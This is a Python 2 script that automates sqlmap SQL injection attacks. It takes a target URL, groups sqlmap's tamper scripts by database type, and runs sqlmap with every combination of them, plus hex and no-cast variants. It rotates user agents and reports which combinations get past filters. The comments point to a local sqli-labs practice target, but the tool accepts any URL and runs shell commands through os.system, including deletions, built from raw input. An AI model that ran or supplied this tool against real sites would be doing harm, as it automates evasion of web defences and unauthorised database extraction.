#http://192.168.2.134/sqli-labs/Less-1/?id=1
#http://192.168.2.134/sqli-labs/Less-1/?id=1 -D security --tables
import os
import re
import itertools
from urlparse import *
print 'input your uri+param_string(eg.http://www.baidu.com/?id=1 -D user --tables -p "id"):',
uri_and_param_string=raw_input()
tmp_list=uri_and_param_string.split(' ')
uri=tmp_list[0]
param_string=uri_and_param_string[len(uri):]


print '''those are DB types:
1>MySQL
2>Microsoft SQL Server(MSSQL)
3>Oracle
4>PostgreSQL
5>Microsoft Access
6>SQLite
select your DB type[Default:1]:>''',
in_put=raw_input()
if in_put=='':
	DB_index=1

elif in_put!='':
	DB_index=int(in_put)
if DB_index==1:
	DB_type='MySQL'
elif DB_index==2:
	DB_type='MSSQL'
elif DB_index==3:
	DB_type='Oracle'
elif DB_index==4:
	DB_type='PostgreSQL'
elif DB_index==5:
	DB_type='Microsoft Access'
elif DB_index==6:
	DB_type='SQLite'

def check_DB_type_from_script(script_name):
	global MySQL
	global MSSQL
	global Oracle
	global PostgreSQL
	global Microsoft_Access
	global SQLite
	global script_has_any_DB
	script_has_any_DB=0	
	f=open('/usr/share/sqlmap/tamper/'+script_name,'r+')
	list=f.readlines()
	f.close()
	for each in list:
		if each.find('MySQL')!=-1 and script_name[:-3] not in MySQL:
			MySQL.append(script_name[:-3])
			script_has_any_DB=1
		if each.find('MSSQL')!=-1 and script_name[:-3] not in MSSQL:
			MSSQL.append(script_name[:-3])
			script_has_any_DB=1
		if each.find('Oracle')!=-1 and script_name[:-3] not in Oracle:
			Oracle.append(script_name[:-3])
			script_has_any_DB=1
		if each.find('PostgreSQL')!=-1 and script_name[:-3] not in PostgreSQL:
			PostgreSQL.append(script_name[:-3])
			script_has_any_DB=1
		if each.find('Microsoft Access')!=-1 and script_name[:-3] not in Microsoft_Access:
			Microsoft_Access.append(script_name[:-3])
			script_has_any_DB=1
		if each.find('SQLite')!=-1 and script_name[:-3] not in SQLite:
			SQLite.append(script_name[:-3])
			script_has_any_DB=1
	if script_has_any_DB==0 and script_name[:-3] not in MySQL+MSSQL+Oracle+PostgreSQL+Microsoft_Access+SQLite:
		MySQL.append(script_name[:-3])
		MSSQL.append(script_name[:-3])
		Oracle.append(script_name[:-3])
		PostgreSQL.append(script_name[:-3])
		Microsoft_Access.append(script_name[:-3])
		SQLite.append(script_name[:-3])

def script_comb_success(tamper_string):
	return False
MySQL=[]
MSSQL=[]
Oracle=[]
PostgreSQL=[]
Microsoft_Access=[]
script_has_any_DB=0
SQLite=[]
os.system('rm /usr/share/sqlmap/tamper/*.pyc')
tamper_names=os.listdir('/usr/share/sqlmap/tamper')
tamper_names.remove('__init__.py')

for each_script in tamper_names:
	check_DB_type_from_script(each_script)

print 'mysql:'
print MySQL
print 'mssql:'
print MSSQL
print 'oracle:'
print Oracle
print 'postgresql:'
print PostgreSQL
print len(MySQL)

def test_tamper_string(tamper_string):	
	global uri
	#from urlparse import *
	import subprocess
	import re	
	safe_url=urlparse(uri).scheme+'://'+urlparse(uri).netloc
	cmd='''python /usr/share/sqlmap/sqlmap.py -u "%s"%s --batch -v 3 --threads 4 --random-agent --safe-url "%s" --safe-freq 1 --tamper=%s --level 3''' % (uri,param_string,safe_url,tamper_string)
	cmd_hex=cmd='''python /usr/share/sqlmap/sqlmap.py -u "%s"%s --batch -v 3 --threads 4 --random-agent --safe-url "%s" --safe-freq 1 --tamper=%s --level 3 --hex''' % (uri,param_string,safe_url,tamper_string)
	cmd_no_cast=cmd='''python /usr/share/sqlmap/sqlmap.py -u "%s"%s --batch -v 3 --threads 4 --random-agent --safe-url "%s" --safe-freq 1 --tamper=%s --level 3 --no-cast''' % (uri,param_string,safe_url,tamper_string)
	rm_folder_cmd='rm -r /root/.sqlmap/output/%s' % urlparse(uri).netloc
	os.system(rm_folder_cmd)
	
	'''
	cmd='python /usr/share/sqlmap/sqlmap.py -u "%s"%s --batch -v 3 --threads 4 --random-agent --safe-url "%s" --safe-freq 1 --tamper=%s --level 3' % (uri,param_string,safe_url,tamper_string)
	data=subprocess.Popen(cmd,stdout=subprocess.PIPE,shell=True)
	string=data.stdout.read()
	print string
	print 'the result is from tamper:%s' % tamper_string
	if re.search(re.compile(r'current\s{1,8}[database|table]'),string):
		print 'congratuations!bypass script is %s,press any key to continue.' % tamper_string
		key=input()
	'''
	log_file='/root/.sqlmap/output/%s/log' % urlparse(uri).netloc

	os.system(cmd)	
	f=open(log_file,'r')
	len_data=len(f.read())
	print len_data
	if len_data!=0:
		print 'congratuations! your tamper try:%s may bypass!' % tamper_string
		print 'your sqlmap sentence is:%s' % cmd
		print 'press anykey to continue test other tamper_string>',
		any_key=raw_input()	
	if len_data==0:		
		print 'you are trying script:%s,but fail' % tamper_string
		#any_key=input()
	f.close()
	os.system(rm_folder_cmd)

	os.system(cmd_hex)		
	f=open(log_file,'r')
	len_data=len(f.read())
	print len_data
	if len_data!=0:
		print 'congratuations! your tamper try:%s may bypass!' % tamper_string
		print 'your sqlmap sentence is:%s' % cmd_hex
		print 'press anykey to continue test other tamper_string>',
		any_key=raw_input()	
	if len_data==0:		
		print 'you are trying script:%s,but fail' % tamper_string
		#any_key=input()
	f.close()
	os.system(rm_folder_cmd)

	os.system(cmd_no_cast)
	f=open(log_file,'r')
	len_data=len(f.read())
	print len_data
	if len_data!=0:
		print 'congratuations! your tamper try:%s may bypass!' % tamper_string
		print 'your sqlmap sentence is:%s' % cmd_no_cast
		print 'press anykey to continue test other tamper_string>',
		any_key=raw_input()	
	if len_data==0:
		print 'you are trying script:%s,but fail' % tamper_string
		#any_key=input()
	f.close()
	os.system(rm_folder_cmd)
def get_from_tuple(the_tuple):
	out=""
	for i in range(len(the_tuple)):
		out+=(the_tuple[i]+',')
	return out[:-1]

def run_all_comb(db_list):
	global try_times
	import itertools
	for i in range(1,len(db_list)+1):
		tmp_list=list(itertools.combinations(db_list,i))
		for j in range(len(tmp_list)):
			tamper_string=get_from_tuple(tmp_list[j])
			test_tamper_string(tamper_string)
			try_times+=1
			print try_times



try_times=0
if DB_type=='MySQL':
	run_all_comb(MySQL)
if DB_type=='MSSQL':
	run_all_comb(MSSQL)
if DB_type=='Oracle':
	run_all_comb(Oracle)
if DB_type=='PostgreSQL':
	run_all_comb(PostgreSQL)
if DB_type=='Microsoft Access':
	run_all_comb(Microsoft_Access)
if DB_type=='SQLite':
	run_all_comb(SQLite)
print 'you tried %d times' % try_times
